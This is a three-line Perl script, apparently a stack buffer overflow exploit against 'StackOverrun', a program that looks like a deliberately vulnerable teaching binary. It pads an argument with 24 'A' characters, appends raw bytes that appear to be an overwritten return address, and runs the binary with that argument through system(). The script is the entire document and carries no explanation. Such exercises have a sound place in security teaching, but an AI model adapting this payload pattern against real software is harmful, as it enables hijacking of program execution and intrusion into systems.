$arg = "AAAAAAAAAAAAAAAAAAAAAAAA"."\x02\x06\x40";
$cmd = "./StackOverrun ".$arg;

system($cmd);

